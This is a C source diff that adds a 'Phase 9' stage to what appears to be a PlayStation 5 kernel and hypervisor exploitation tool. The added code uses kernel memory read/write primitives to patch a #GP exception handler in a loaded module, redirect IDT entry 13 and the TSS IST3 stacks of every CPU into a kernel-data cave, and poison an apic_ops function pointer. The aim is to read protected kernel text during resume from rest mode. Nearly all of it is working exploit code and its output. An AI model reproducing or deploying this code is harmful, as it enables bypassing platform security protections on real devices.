@@ -147,6 +147,8 @@ struct kmod_result_buf {
     /* Phase 7: trampoline addresses (filled by kmod init) */
     volatile uint64_t trampoline_func_kva;    /* KVA of trampoline_xapic_mode() */
     volatile uint64_t trampoline_target_kva;  /* KVA of g_trampoline_target */
+    /* Phase 9: #GP handler (filled by kmod init) */
+    volatile uint64_t gp_handler_kva;         /* KVA of gp_handler() */
 };
 
 /* kldsym lookup structure (matches FreeBSD sys/kld.h) */
@@ -196,6 +198,7 @@ static int      g_apic_ops_count = 0;  /* Number of entries (typically 28) */
 /* Kmod trampoline addresses (set by kmod campaign, used by Phase 7) */
 static uint64_t g_kmod_trampoline_func = 0;    /* KVA of trampoline_xapic_mode() in kmod .text */
 static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in kmod .data */
+static uint64_t g_kmod_gp_handler = 0;         /* KVA of gp_handler() in kmod .text */
 static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */
 
 /* SBL kernel data offsets for FW 4.03 */
@@ -2605,6 +2608,11 @@ static void campaign_kmod_kldload(void) {
             printf("    g_trampoline_target     = 0x%016lx\n",
                    (unsigned long)g_kmod_trampoline_target);
         }
+        if (!g_kmod_gp_handler && results->gp_handler_kva != 0) {
+            g_kmod_gp_handler = results->gp_handler_kva;
+            printf("    gp_handler()            = 0x%016lx\n",
+                   (unsigned long)g_kmod_gp_handler);
+        }
 
         goto idt_done;
 
@@ -4743,6 +4751,11 @@ idt_skip: ;
         } else {
             printf("    [-] Result buffer also has zeros.\n");
         }
+        if (!g_kmod_gp_handler && results->gp_handler_kva != 0) {
+            g_kmod_gp_handler = results->gp_handler_kva;
+            printf("    gp_handler()            = 0x%016lx\n",
+                   (unsigned long)g_kmod_gp_handler);
+        }
     }
 
     /* Step 5: Unload the module (skip if Phase 7 needs it) */
@@ -5337,6 +5350,64 @@ static void campaign_flatz_setup(void) {
             kernel_set_qaflags(p7_qa);
             printf("[*] QA marker cleared.\n");
 
+            /* ── Phase 9 post-resume: check if #GP handler fired ── */
+            #define P9_MARKER_MAGIC_CHECK 0x50484153453921ULL
+            if (cave_persisted) {
+                uint64_t cave_pa_p9 = va_to_pa_quiet(g_kdata_base);
+                uint64_t p9_cave_kva = 0;
+                if (cave_pa_p9) {
+                    uint8_t mkr[32];
+                    kernel_copyout(g_dmap_base + cave_pa_p9, mkr, 32);
+                    memcpy(&p9_cave_kva, &mkr[0x18], 8);
+                }
+                if (p9_cave_kva) {
+                    uint64_t p9_cave_pa = va_to_pa_quiet(p9_cave_kva);
+                    if (p9_cave_pa) {
+                        uint64_t p9_marker = 0, p9_proof = 0;
+                        kernel_copyout(g_dmap_base + p9_cave_pa + 0x120, &p9_marker, 8);
+                        kernel_copyout(g_dmap_base + p9_cave_pa + 0x118, &p9_proof, 8);
+                        if (p9_marker == P9_MARKER_MAGIC_CHECK) {
+                            printf("\n[*] Phase 9 post-resume check:\n");
+                            printf("    Cave KVA: 0x%lx\n", (unsigned long)p9_cave_kva);
+                            printf("    Phase 9 marker: FOUND\n");
+                            if (p9_proof) {
+                                printf("    ktext proof: 0x%016lx — #GP HANDLER FIRED!\n",
+                                       (unsigned long)p9_proof);
+                                printf("    *** ktext was readable during resume! ***\n");
+                            } else {
+                                printf("    ktext proof: (empty) — handler may not have fired\n");
+                            }
+                            /* Check if IDT[13] was restored */
+                            uint8_t idt13_check[16];
+                            uint64_t idt_check_pa = va_to_pa_quiet(
+                                g_kdata_base + 0x64cdc80ULL);
+                            if (idt_check_pa) {
+                                kernel_copyout(g_dmap_base + idt_check_pa + 16*13,
+                                               idt13_check, 16);
+                                uint8_t ist_now = idt13_check[4] & 0x07;
+                                printf("    IDT[13] IST now: %d %s\n", ist_now,
+                                       ist_now == 0 ? "(restored)" : "(still modified!)");
+                            }
+                            /* Check apic_ops[2] */
+                            uint64_t ops2_now = ops[2];
+                            uint64_t ops2_saved = 0;
+                            kernel_copyout(g_dmap_base + p9_cave_pa + 0x110,
+                                           &ops2_saved, 8);
+                            printf("    apic_ops[2] now:  0x%016lx\n",
+                                   (unsigned long)ops2_now);
+                            printf("    apic_ops[2] saved: 0x%016lx\n",
+                                   (unsigned long)ops2_saved);
+                            if (ops2_now == ops2_saved)
+                                printf("    → RESTORED (handler worked!)\n");
+                            else if ((ops2_now >> 48) == 0xDEB7)
+                                printf("    → STILL POISONED (handler didn't fire?)\n");
+                            else
+                                printf("    → DIFFERENT (kernel reinitialized)\n");
+                        }
+                    }
+                }
+            }
+
             notify("[HV Research] Phase 7: Post-resume check complete!");
 
         } else {
@@ -5752,6 +5823,256 @@ static void campaign_flatz_setup(void) {
         printf("[+]  It's a bare 'ret' in ktext — safe, no side effects.\n");
 
         printf("\n");
+        fflush(stdout);
+
+        /* ─── Phase 9: Arm flatz method (#GP hook + pointer poison) ───
+         *
+         * Using the kmod's gp_handler (executable kernel code) as the
+         * IDT[13] handler.  When #GP fires during resume:
+         *   1. CPU switches to IST3 stack (in our cave)
+         *   2. gp_handler reads ktext (proof of readability)
+         *   3. gp_handler restores original IDT[13]
+         *   4. gp_handler restores original apic_ops[2]
+         *   5. iretq re-executes the call (now valid)
+         *
+         * Key PS5 values (from ps5-kstuff):
+         *   TF_RIP = 0xE8 (232) — PS5 trap frame is larger than FreeBSD
+         *   IST3 offset in TSS = 0x34 (28 + 3*8)
+         *   TSS stride per CPU = 0x68
+         *   Poison prefix = 0xdeb7 (replaces top 16 bits)
+         */
+        printf("\n=============================================\n");
+        printf("  Phase 9: Arm Flatz Method\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        if (!g_kmod_gp_handler) {
+            printf("[-] No gp_handler KVA from kmod — cannot arm Phase 9.\n");
+            fflush(stdout);
+            return;
+        }
+        if (!idt_pa || !tss_pa) {
+            printf("[-] IDT/TSS PA not resolved — cannot arm Phase 9.\n");
+            fflush(stdout);
+            return;
+        }
+
+        /* Validate IDT[13] and TSS are sane before modifying */
+        uint8_t idt13_orig[16];
+        kernel_copyout(g_dmap_base + idt_pa + 16 * 13, idt13_orig, 16);
+        uint64_t tss_rsp0 = 0;
+        kernel_copyout(g_dmap_base + tss_pa + 0x04, &tss_rsp0, 8);
+        if (!(idt13_orig[5] & 0x80) || tss_rsp0 < 0xFFFF800000000000ULL) {
+            printf("[-] IDT[13]/TSS validation failed — aborting Phase 9.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] IDT[13] present, TSS RSP0 valid\n");
+
+        /* ── Find a zero-filled cave in kdata (640 bytes) ── */
+        #define CAVE_SIZE 0x280
+        #define P9_MARKER_MAGIC 0x50484153453921ULL  /* "PHASE9!" */
+
+        uint64_t cave_candidates[] = {
+            KSTUFF_TSS_OFF + 16 * 0x68 + 0x50,  /* after all TSS entries */
+            KSTUFF_GDT_OFF + 0x1000,
+            KSTUFF_QA_FLAGS_OFF + 0x1000,
+        };
+        uint64_t cave_kva = 0, cave_pa = 0;
+        uint8_t probe[CAVE_SIZE];
+        for (int ci = 0; ci < 3; ci++) {
+            uint64_t kva = g_kdata_base + cave_candidates[ci];
+            uint64_t pa  = va_to_pa_quiet(kva);
+            if (!pa) continue;
+            kernel_copyout(g_dmap_base + pa, probe, CAVE_SIZE);
+            int empty = 1;
+            for (int j = 0; j < CAVE_SIZE; j++)
+                if (probe[j]) { empty = 0; break; }
+            if (empty) { cave_kva = kva; cave_pa = pa; break; }
+        }
+        if (!cave_pa) {
+            printf("[-] No zero-filled cave found — aborting Phase 9.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] Cave found: KVA=0x%lx PA=0x%lx\n",
+               (unsigned long)cave_kva, (unsigned long)cave_pa);
+
+        /* Save cave KVA in FLATZHOO marker (offset 0x18) */
+        {
+            uint64_t mkr_pa = va_to_pa_quiet(g_kdata_base);
+            if (mkr_pa)
+                kernel_copyin(&cave_kva, g_dmap_base + mkr_pa + 0x18, 8);
+        }
+
+        uint64_t original_xapic = ops[2];
+
+        /*
+         * Cave layout:
+         *   0x000-0x0FF: IST3 stack (grows downward from cave+0x100)
+         *   0x100-0x10F: original IDT[13] backup (16 bytes)
+         *   0x110-0x117: original xapic_mode value (8 bytes)
+         *   0x118-0x11F: ktext proof (written by gp_handler)
+         *   0x120-0x127: phase 9 marker (P9_MARKER_MAGIC)
+         *   0x128-0x12F: gp_handler KVA (for post-resume diagnostics)
+         */
+        uint64_t cave_dmap = g_dmap_base + cave_pa;
+
+        /* Write IDT[13] backup to cave+0x100 */
+        kernel_copyin(idt13_orig, cave_dmap + 0x100, 16);
+
+        /* Write original xapic value to cave+0x110 */
+        kernel_copyin(&original_xapic, cave_dmap + 0x110, 8);
+
+        /* Write Phase 9 marker to cave+0x120 */
+        uint64_t p9_magic = P9_MARKER_MAGIC;
+        kernel_copyin(&p9_magic, cave_dmap + 0x120, 8);
+
+        /* Write gp_handler KVA to cave+0x128 */
+        kernel_copyin(&g_kmod_gp_handler, cave_dmap + 0x128, 8);
+
+        printf("[+] Cave data written (IDT backup, xapic, markers)\n");
+
+        /* ── Patch gp_handler's magic values via DMAP ── */
+        uint64_t gp_pa = va_to_pa_quiet(g_kmod_gp_handler);
+        if (!gp_pa) {
+            printf("[-] gp_handler VA→PA failed — aborting.\n");
+            fflush(stdout);
+            return;
+        }
+        uint64_t gp_dmap = g_dmap_base + gp_pa;
+
+        /* Read handler bytes and patch each magic value */
+        uint8_t handler_code[0x60];  /* handler is ~90 bytes */
+        kernel_copyout(gp_dmap, handler_code, sizeof(handler_code));
+
+        struct {
+            uint64_t magic;
+            uint64_t replacement;
+        } patches[] = {
+            { 0xDEAD000000000001ULL, g_ktext_base },            /* ktext addr to read */
+            { 0xDEAD000000000002ULL, cave_dmap + 0x118 },       /* proof write slot */
+            { 0xDEAD000000000003ULL, cave_dmap + 0x100 },       /* IDT backup source */
+            { 0xDEAD000000000004ULL, g_dmap_base + idt_pa + 16 * 13 }, /* IDT[13] dest */
+            { 0xDEAD000000000005ULL, original_xapic },          /* original xapic VALUE */
+            { 0xDEAD000000000006ULL, g_dmap_base + ops_pa + 2 * 8 },  /* apic_ops[2] addr */
+        };
+        int patches_applied = 0;
+        for (int pi = 0; pi < 6; pi++) {
+            for (int off = 0; off <= (int)sizeof(handler_code) - 8; off++) {
+                uint64_t val;
+                memcpy(&val, &handler_code[off], 8);
+                if (val == patches[pi].magic) {
+                    memcpy(&handler_code[off], &patches[pi].replacement, 8);
+                    patches_applied++;
+                    break;
+                }
+            }
+        }
+        if (patches_applied != 6) {
+            printf("[-] Only patched %d/6 magic values — aborting.\n",
+                   patches_applied);
+            fflush(stdout);
+            return;
+        }
+
+        /* Write patched handler back */
+        kernel_copyin(handler_code, gp_dmap, sizeof(handler_code));
+
+        /* Verify the write */
+        uint8_t handler_verify[0x60];
+        kernel_copyout(gp_dmap, handler_verify, sizeof(handler_verify));
+        if (memcmp(handler_code, handler_verify, sizeof(handler_code))) {
+            printf("[-] Handler patch verification FAILED — aborting.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] gp_handler patched (%d/6 magic values replaced)\n",
+               patches_applied);
+
+        /* ── Patch IDT[13]: handler → gp_handler, IST = 3 ── */
+        uint8_t idt13_new[16];
+        memcpy(idt13_new, idt13_orig, 16);
+        uint64_t h = g_kmod_gp_handler;
+        uint16_t h_lo = h & 0xFFFF;
+        uint16_t h_mid = (h >> 16) & 0xFFFF;
+        uint32_t h_hi = (h >> 32) & 0xFFFFFFFF;
+        memcpy(&idt13_new[0], &h_lo, 2);
+        memcpy(&idt13_new[6], &h_mid, 2);
+        memcpy(&idt13_new[8], &h_hi, 4);
+        idt13_new[4] = (idt13_orig[4] & 0xF8) | 0x03;  /* IST = 3 */
+
+        kernel_copyin(idt13_new, g_dmap_base + idt_pa + 16 * 13, 16);
+
+        /* Verify */
+        uint8_t idt13_verify[16];
+        kernel_copyout(g_dmap_base + idt_pa + 16 * 13, idt13_verify, 16);
+        if (memcmp(idt13_new, idt13_verify, 16)) {
+            /* Restore original on failure */
+            kernel_copyin(idt13_orig, g_dmap_base + idt_pa + 16 * 13, 16);
+            printf("[-] IDT[13] patch FAILED — restored original.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] IDT[13] patched → gp_handler (IST=3)\n");
+
+        /* ── Set TSS IST3 for all CPUs → cave stack top ── */
+        uint64_t ist3_target = cave_kva + 0x100;  /* stack grows DOWN from here */
+        uint64_t ist3_off = 0x24 + 2 * 8;         /* = 0x34 = IST3 offset in TSS */
+        uint64_t orig_ist3 = 0;
+        kernel_copyout(g_dmap_base + tss_pa + ist3_off, &orig_ist3, 8);
+
+        /* Save original IST3 in cave+0x130 for diagnostics */
+        kernel_copyin(&orig_ist3, cave_dmap + 0x130, 8);
+
+        int cpus_patched = 0;
+        for (int cpu = 0; cpu < 16; cpu++) {
+            uint64_t tp = va_to_pa_quiet(g_kdata_base + KSTUFF_TSS_OFF + 0x68 * cpu);
+            if (!tp) break;
+            kernel_copyin(&ist3_target, g_dmap_base + tp + ist3_off, 8);
+            cpus_patched++;
+        }
+        printf("[+] TSS IST3 set for %d CPUs → cave+0x100\n", cpus_patched);
+
+        /* ── Poison apic_ops[2]: top 16 bits → 0xdeb7 ── */
+        uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL)
+                          | 0xDEB7000000000000ULL;
+        kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
+
+        /* Verify poison was written */
+        uint64_t poison_check = 0;
+        kernel_copyout(g_dmap_base + ops_pa + 2 * 8, &poison_check, 8);
+        if (poison_check != poisoned) {
+            /* Critical failure — try to undo everything */
+            kernel_copyin(idt13_orig, g_dmap_base + idt_pa + 16 * 13, 16);
+            printf("[-] Pointer poison FAILED — IDT restored, aborting.\n");
+            fflush(stdout);
+            return;
+        }
+
+        printf("[+] apic_ops[2] poisoned: 0x%016lx → 0x%016lx\n",
+               (unsigned long)original_xapic, (unsigned long)poisoned);
+
+        printf("\n[+] ============================================\n");
+        printf("[+]  PHASE 9 ARMED — FLATZ METHOD READY\n");
+        printf("[+] ============================================\n");
+        printf("[+]\n");
+        printf("[+]  IDT[13] → gp_handler @ 0x%lx (IST=3)\n",
+               (unsigned long)g_kmod_gp_handler);
+        printf("[+]  IST3    → cave+0x100 @ 0x%lx\n",
+               (unsigned long)ist3_target);
+        printf("[+]  apic_ops[2] = 0x%016lx (poisoned)\n",
+               (unsigned long)poisoned);
+        printf("[+]  Original xapic: 0x%016lx (backed up)\n",
+               (unsigned long)original_xapic);
+        printf("[+]\n");
+        printf("[+]  Enter REST MODE now!\n");
+        printf("[+]  On resume: xapic_mode() → #GP → gp_handler\n");
+        printf("[+]  → reads ktext proof → restores IDT → restores ptr\n");
+        printf("[+]  → iretq → call succeeds → normal boot\n");
+
+        notify("[HV Research] Phase 9 ARMED! Enter REST MODE!");
+
         fflush(stdout);
         return;
     }
